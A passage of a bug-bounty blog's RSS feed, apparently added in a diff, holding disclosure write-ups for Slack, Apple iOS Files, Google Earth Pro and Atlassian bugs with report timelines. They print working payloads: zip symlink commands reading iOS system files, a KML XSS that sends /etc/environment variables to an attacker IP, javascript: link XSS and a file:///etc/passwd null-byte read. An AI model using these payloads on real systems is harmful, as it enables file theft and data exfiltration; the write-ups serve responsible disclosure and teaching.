+<p>​4.- Open the link directly slack iOS app and the XSS shows up (if you open the link in any iOS browser like Safari, Firefox, Chrome, Opera the XSS works, you just need to be logged in your slack account, only works in iOS).</p>
+
+
+
+<p><strong>Impact:</strong></p>
+
+
+
+<p>Stored XSS allows an attacker to embed a malicious and arbitraries scripts into a vulnerable page, which is then executed when a victim views the page.</p>
+
+
+<p></p>
+
+
+<p><strong>Environment:</strong></p>
+
+
+
+<p>iPhone 6 &#8211; iOS v11.2.5.<br>​Safari Lastest version <br>Google Chrome Lastest version <br>​My personal slack workspace / account and all testing was seding files to myself.</p>
+
+
+
+<p><p><strong>Slack HOF (June 2019):<br></strong></p>
+<p><a href="https://hackerone.com/slack/thanks/2018?type=team">https://hackerone.com/slack/thanks/2018?type=team</a><br><br></p>
+<p><b>Report Timeline:</b></p>
+<p><b></b></p>
+<p>
+<b>
+Feb 5, 2018: Sent the report to Slack team<br>
+Feb 13, 2018: Got a message from the Slack team that the bug was triaged [ High (7 ~ 8.9)]<br>
+Feb 14, 2019: $1,000 bounty rewarded (one year later! w0000t!)<br>
+Jun 5, 2019: Fixed by Slack team</b></p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-xss-stored-in-files-slack-com-via-xml-svg-file-ios-1000-usd/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP &#8211; APPLE N/A: PII information, full contact list, main phone no. and main iCloud email extracted; Bug patched: Arbitrary local file read via zip file and symlinks on iOS Files app.</title>
+		<link>/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/</link>
+					<comments>/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Wed, 17 Nov 2021 23:53:15 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1492</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to get an Arbitrary local file read on iOS Files app via zip file and symlinks Disclaimer: Unfortunately, after 13 months of [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to get an Arbitrary local file read on iOS Files app via zip file and symlinks</p>
+
+
+
+<p>Disclaimer: Unfortunately, after 13 months of waiting and the bug patched, Apple didn&#8217;t consider this as security issue and it wasn&#8217;t rewarded.<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p></p>
+
+
+
+<p><br><strong>Extracted from Apple Bug Bounty report: (the actual Apple Bug Bount report): </strong></p>
+
+
+
+<p><b>Title:</b> Arbitrary local file read via zip file and symlinks  <br>
+</p>
+
+
+
+<p>1.- Prepare the zip file in the Macbook (or any unix* like computer):
+</p>
+
+
+
+<pre class="wp-block-code"><code># Make a new directory called symlinks 
+mkdir symlinks; cd symlinks
+# Make a new directory called symlinks 
+mkdir symlinks; cd symlinks
+
+# Go to the directory and create the following symlinks
+ln -sf /private/etc/group etc_group.txt
+ln -sf /private/etc/hosts etc_hosts.txt
+ln -sf /private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist identityservices.idstatuscache.plist.txt
+ln -sf /private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist commcenter.shared.plist.txt 
+ln -sf /private/var/mobile/Library/Preferences/com.apple.sharingd.plist sharingd.plist.txt 
+
+# Then inside of symlinks' directory create the special zip file that allows symlinks 
+zip --symlinks -r symlinks.zip .
+
+# After that share the file with your iOS device 
+# In this case, I shared the file via Airdrop
+</code></pre>
+
+
+
+<p><br>
+2.- On Iphone&#8217;s
+<br>&#8211; Go to the File app &gt; Downloads and click the symlinks.zip file
+<br>&#8211; then navigate inside to the symlinks folder
+<br>&#8211; choose any file and send it back to the Macbook via iDrop
+<br><br>3.- On Macbook, receive the file, append .txt in the filename, open it, and profit!
+<br>PS. zip file attached with video and the symlinks.zip file password: __REDACTED__
+</p>
+
+
+<div style="text-align: center !important;"><iframe loading="lazy" id="player" src="https://www.youtube.com/embed/kkK9flvRjks" width="1024" height="390" frameborder="0"></iframe></div>
+<p></p>
+
+
+<p> <br>Enviroment:
+<br>&#8211; iPhone 8 – iOS version 14.0.1
+<br>&#8211; Files iOS app lastest version
+<br>&#8211; Macbook pro macOS catalina version 10.15.6
+<br>&#8211; My personal devices and personal iCloud account
+</p>
+
+
+
+<p>
+<br>Is this bug public or known by third parties?​: No​
+<br>Can I reproduce this issue every time? Yes
+<br>How did I find this bug? Manually / Other
+</p>
+
+
+<p><b>Report Timeline:</b></p>
+<p>Oct 14, 2020: Sent the report to Apple<br>Oct 18, 2020: Automated response from Apple: &#8220;Because of the potentially sensitive nature of security issues, we ask that this information remains between you and Apple while we investigate it further.&#8221;<br>Jan 18, 2021: I sent a message to follow up, asking for any update on this issue<br>Jan 21, 2021: Got a message from Apple &#8220;We are still investigating and have no new status updates to share at this time.&#8221; <br>Apr 07, 2021: I sent another message to follow up, asking for any update on this issue<br>Apr 07, 2021: Got a message from Apple &#8220;We are planning to address this issue in an upcoming security update in the summer of 2021. To avoid placing our customers at risk, we would appreciate you not disclosing this information until the necessary updates are available.&#8221;<br>Jul 27, 2021: I sent another message to follow up, asking for any update on this issue<br>Jul 28, 2021: Got a message from Apple &#8220;This issue was addressed with the release of iOS 14.5. REDACTED, REDACTED, REDACTED, we want to publicly acknowledge your assistance on our security advisory.&#8221;<br>Jul 28, 2021: I sent a Thank you mesage asking for any reward Bug Bounty decision and permission to disclose this bug.<br>Sep 07, 2021: Got a message from Apple &#8220;Thank you for letting us know of your plans publish your report. Due to a process issue, your credit information was not published to our advisories. We will credit you as &#8220;Omar Espino (omespino.com)&#8221; in a future update to our advisories.&#8221;<br>Sep 07, 2021: I another message asking for any reward Bug Bounty decision.&nbsp;<br>Oct 07, 2021: Got a message from Apple &#8220;We do not have any update yet. We should have an update at the beginning of next month.&#8221;<br>Nov 11, 2021: I another message asking for any reward Bug Bounty decision.&nbsp;<br>Nov 17, 2021: Got a message from Apple &#8220;This issue has been reviewed for the Apple Security Bounty and, unfortunately, it does not qualify. This is because the reported issue and your proof-of-concept do not demonstrate the categories listed on https://developer.apple.com/security-bounty/payouts/.&#8221;</p>
+<p><b>&nbsp;</b></p>
+<p></p>
+<p>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.</p>
+<p></p>
+
+
+<p></p>
+
+
+<p></p>]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP &#8211; GOOGLE VRP BUG BOUNTY: /etc/environment local variables exfiltrated on Linux Google Earth Pro desktop app &#8211; $1,337 USD</title>
+		<link>/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/</link>
+					<comments>/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Thu, 11 Nov 2021 20:26:58 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1615</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to exfiltrate /etc/environment local variables on the Google Earth Pro Desktop app on Linux. If you like Bug Bounty writeups please check [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to exfiltrate /etc/environment local variables on the Google Earth Pro Desktop app on Linux.<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p><br><br><strong>Extracted from Google VRP&#8217;s report: (the actual Google VRP report) </strong></p>
+
+
+
+<p><em>Summary: /etc/enviroment local variables disclosed on Linux Google Earth Pro desktop app<br></em><br><em>Steps to reproduce: </em></p>
+
+
+<p><em>1.- Download and install the latest <a href="https://www.google.com/intl/en/earth/versions/#download-pro"> Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit / .deb)</a></em></p>
+<p><em>2.- Put your attacker server to listen in any port with netcat, in my case port 80:</em></p>
+<pre class="wp-block-code"><code> localh0st:~ user$ sudo nc -l -p 80</code></pre>
+<p><em>3.- Open the file attached <a href="https://drive.google.com/file/d/1yokdqGwWOQ3GJc7VQPruNjdOkrVUequx/view">etc_environment.kml</a> and modify the part where CDATA is and put your attacker server IP and save it. (extract of that file and actual XSS poc):</em></p>
+<pre class="wp-block-code"><code>&lt;Placemark&gt;                                                                        &lt;name&gt;placemark&lt;/name&gt;&lt;description&gt;                                                                                  &lt;![CDATA[                                                                                           &lt;script src=file:../../../../../../../etc/environment&gt;&lt;/script&gt;                                                                                            &lt;script&gt;                                                                                    document.write('XSS fired :-)&lt;br&gt;');                                                                       document.write('Location: ' + location.href + '&lt;br&gt;');                                       document.write('&lt;br&gt;PATH var = ' + PATH);                                          document.write('&lt;br&gt;JAVA_HOME var = ' + JAVA_HOME);                                                                   document.write('&lt;img src=http://192.168.0.11/?path=' + PATH + '&amp;java_home=' + JAVA_HOME + '&gt;'); &lt;/script&gt;                                                                                               ]]&gt;&lt;/description&gt;
+</code></pre>
+
+
+<p><em>4.- Just open the <strong>etc_environment.kml</strong> file with a double click, once you see the red polygon click it to see the description and the XSS would be fire, it would contain variables from /etc/environment system file and send those to the attacker server</em></p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="/wp-content/uploads/2021/11/etc_environment_ge_linux.jpg"><img class="wp-image-772" src="/wp-content/uploads/2021/11/etc_environment_ge_linux.jpg" alt=""></a></figure>
+</div>
+<p><em>5.- Profit</em></p>
+<p><em>Explanation, since we can inject random HTML/js code, we can &#8220;import&#8221; files with the script tag, per example &#8220;&lt;script src=file:///../../../../etc/enviroment&gt;&lt;/script&gt;&#8221;, so if the file has the right js format the browser would load any content, since the common format of /etc/environment is like:</em></p>
+<pre class="wp-block-code"><code>PATH="/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin" <br>JAVA_HOME="/opt/jre/bin"
+</code></pre>
+<p>this would actually load because those variables have the same format that javascript variables ;-), plus since any linux environment vars are so predictable we can brute force the most common variables names and send them to the attacker server</p>
+<p>UPDATE: You could also exfiltrate all vars from the /etc/environment file since &#8220;Object.keys(window)&#8221; would load any declared variable in the DOM <a href="https://stackoverflow.com/a/17276249">(stack overflow reference)</a> </p>
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="/wp-content/uploads/2021/11/etc_environment_DOM.png"><img class="wp-image-772" src="/wp-content/uploads/2021/11/etc_environment_DOM.png" alt=""></a></figure>
+</div>
+<p><em><b></b></em></p>
+<p><em><b></b></em></p>
+<p><em><b></b></em></p>
+<p><em><b></b></em></p>
+<p><em><b></b></em></p>
+<p><em>Attack scenario<br>Any attacker can read arbitrary variables from /etc/environment on Linux through the Google Earth Pro Desktop app via XSS<br></em></p>
+<div style="text-align: center !important;"><iframe loading="lazy" id="player" src="https://www.youtube.com/embed/ZMBbnALLRjU" width="1024" height="390" frameborder="0"></iframe></div>
+<p></p>
+<p><!-- /wp:paragraph --></p>
+<p><b>Report Timeline:</b></p>
+<p></p>
+<p><aug 20,="" 2021:="" sent="" the="" report="" to="" google="" vrp<br="">Aug 23, 2021: <img style="height: auto; width: 16px; border-radius: 0px !important;" src="/wp-content/uploads/2021/01/download-1.png">Nice catch Bug Accepted (P4 → P3)<br>Aug 23, 2021: Got a message from Google that the issue is working as intended<br>Sep 01, 2021: I sent a clarification message and then the issue was sent to review<br>Sep 09, 2021: $1,337 bounty awarded<br>Oct 03, 2021: Got a message from Google that the issue report has been closed without providing a fix (Status Won&#8217;t fix) w00t?!</aug></p>
+<p><b>&nbsp;</b></p>
+<p>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.</p>]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP – ATLASSIAN BUG BOUNTY: XSS STORED IN API.MEDIA.ATLASSIAN.COM VIA DOC FILE (IOS)</title>
+		<link>/write-up-xss-stored-in-api-media-atlassian-com-via-doc-file-ios/</link>
+					<comments>/write-up-xss-stored-in-api-media-atlassian-com-via-doc-file-ios/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Thu, 28 Oct 2021 17:37:53 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1352</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about the Atlassian bug bounty program and why you can always check the basic payloads because you will surprise that some times will work: This blogpost appeared first in the book Bug Bounty [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><strong>Introduction:</strong></p>
+
+
+
+<p><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about the Atlassian bug bounty program and why you can always check the basic payloads because you will surprise that some times will work:<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p></p>
+
+
+
+<p><br><strong>Title:</strong> XSS stored on file https://api.media.atlassian.com/ on iOS browsers via msoffice (doc) file. 
+<br><br><strong>Product / URL: ​</strong>Any associated *.atlassian.com or *.atl-paas.net domain that can be exploited DIRECTLY from the *.atlassian.net instance
+<br><br><strong>Report sent via Bugcrowd Atlassian Program</strong></p>
+
+
+
+<p>Hi Atlassian team.</p>
+
+
+
+<p>I&#8217;ve found a XSS stored on file https://api.media.atlassian.com/ on iOS browsers via msoffice (doc) file</p>
+
+
+
+<p><strong>POC:</strong></p>
+
+
+
+<p>1.- Create a msoffice document per example a word office document with an hyperlink pointing to the url address &#8220;javascript:alert(1)//%22onclick=alert(2)//&#8221; and save as &#8220;Word 97-2003 Document&#8221;, Is very important save the doc as 97-2003, if you don&#8217;t save the document as this version the bug reproduction may not work.</p>
+
+
+
+<p>2.-Look to any confluence public page (In my case I created a confluence test page with anonymous permissions https://bugbounty-test-omespino.atlassian.net)/ that allow post comments via anonymous user and post the document as a comment (XSS-iOS-omespino.doc file attached):
+
+</p>
+
+
+
+<p>Something important to highlight is: At this time you have a &#8220;magic&#8221; link that points directly to the doc special crafted document. ​</p>
+
+
+
+<p>3.- Copy the URL to the word document and paste it in any iOS browser like Safari, Firefox, Chrome, or Opera, then click the hyperlink and see the XSS shows up, since is a confluence public page, you don&#8217;t need to be logged in. <br><br>
+
+</p>
+
+
+
+<div style="text-align: center !important;">
+<iframe loading="lazy" id="player" type="text/html" width="1024" height="390" src="https://www.youtube.com/embed/oUgcIBhtSHk" frameborder="0"></iframe>
+</div>
+
+
+<p></p>
+
+
+<p><br><br>
+<p><strong>Impact:</strong></p></p>
+
+
+
+<p>Stored XSS allows an attacker to embed a malicious and arbitraries scripts into a vulnerable page, which is then executed when a victim views the page.</p>
+
+
+
+<p><strong>Environment:</strong></p>
+
+
+
+<p>iPhone 6 &#8211; iOS v11.2.5.<br>​Safari Lastest version <br>Google Chrome / Safaria Lastest version <br>​My personal email account and all testing was seding emails to myself.</p>
+
+
+<p><b>Report Timeline:</b></p>
+<p>
+Feb 19, 2018: Sent the report to Atlassian team<br>
+Feb 21, 2018: Got a message from Atlassian team that they could not replicate the bug<br>
+Feb 22, 2018: Sent clarification to Atlassian team<br>
+Mar 05, 2018: Report triaged<br>
+Mar 19, 2018: Fixed and rewarded</p>
+<p>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.</p>
+<p></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-xss-stored-in-api-media-atlassian-com-via-doc-file-ios/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP &#8211; GOOGLE VRP N/A: Arbitrary local file read (macOS) via &#060;a&#062; tag and null byte (%00) in Google Earth Pro Desktop app</title>
+		<link>/write-up-google-vrp-n-a-arbitrary-local-file-read-macos-via-a-tag-and-null-byte-in-google-earth-pro-desktop-app/</link>
+					<comments>/write-up-google-vrp-n-a-arbitrary-local-file-read-macos-via-a-tag-and-null-byte-in-google-earth-pro-desktop-app/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Thu, 14 Oct 2021 13:38:47 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1201</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to get an Arbitrary local macOS file read via &#60;a&#62; tag and null byte (%00) in Google Earth Pro Desktop app This [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to get an Arbitrary local macOS file read via &lt;a&gt; tag and null byte (%00) in Google Earth Pro Desktop app <br><br></p>
+
+
+
+<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p></p>
+
+
+
+<p><br><br><strong>Extracted from Google VRP&#8217;s report: (the actual Google VRP report) </strong></p>
+
+
+
+<p><em>Summary: Arbitrary local file read (macOS) via &lt;a&gt; and null byte (%00) element in Google Earth Pro Desktop app <br></em><br><em>Steps to reproduce: </em></p>
+
+
+
+<p><em>1.- Download and install the latest  <a href=https://www.google.com/intl/en/earth/versions/#download-pro> Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit)</a></em></p>
+
+
+
+<p><em>2.- Open the Google Earth app and create a new Pin, add any name add click on add link, and paste this code in the white box 
+
+<pre class="wp-block-code"><code>&lt;a href="file:///etc/passwd%00.html"&gt;passwd&lt;/a&gt; 
+</code></pre></em></p>
+<p><em>and click OK button</em></p>
+
+
+
+<p><em>3.- After Pin&#8217;s creation, in the left side pane Places, click in the hyperlink called <span class="payload-highlight"><b>passwd</b></span> add see <span class="payload-highlight"><b>/etc/passwd</b></span> file content</em></p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="/wp-content/uploads/2021/04/ge-lfd-macos.jpg"><img src="/wp-content/uploads/2021/04/ge-lfd-macos.jpg" alt="" class="wp-image-772"></a></figure>
+</div>
+<p><em>4.- Profit</em></p>
+<p><em><b>PS. any attacker can read any file with file:/// schema and appending a null byte and dot HTML extension (%00.html)</b></em></p>
+<p><em>Attack scenario<br>
+Any attacker can read arbitrary files on macOS through the Google Earth Pro Desktop app<br>
+</em></p>
+<div style="text-align: center !important;">
+<iframe loading="lazy" id="player" type="text/html" width="1024" height="390" src="https://www.youtube.com/embed/HBk8DaRCCFE" frameborder="0"></iframe>
+</div>
+<p></p>
+<p><!-- /wp:paragraph --></p>
+<p><b>Report Timeline:</b></p>
+<p><b></b></p>
+<p><b>Apr 17, 2021: Sent the report to Google VRP<br>
+Apr 19, 2021: <img style=" height: auto; width: 16px; border-radius: 0px !important;" src="/wp-content/uploads/2021/01/download-1.png"> <b>Nice catch!</b> Bug Accepted (P4 → P2)<br>
+Apr 27, 2021: Got a message from Google that the issue does not meet the bar for a financial reward<br>
+May 05, 2021: Got a message from Google that the issue report has been closed without providing a fix (Status Won&#8217;t fix)</b></p>
+<p><b><br>
+</b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p><b>
+<p>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.</p>
+</b><p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-google-vrp-n-a-arbitrary-local-file-read-macos-via-a-tag-and-null-byte-in-google-earth-pro-desktop-app/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
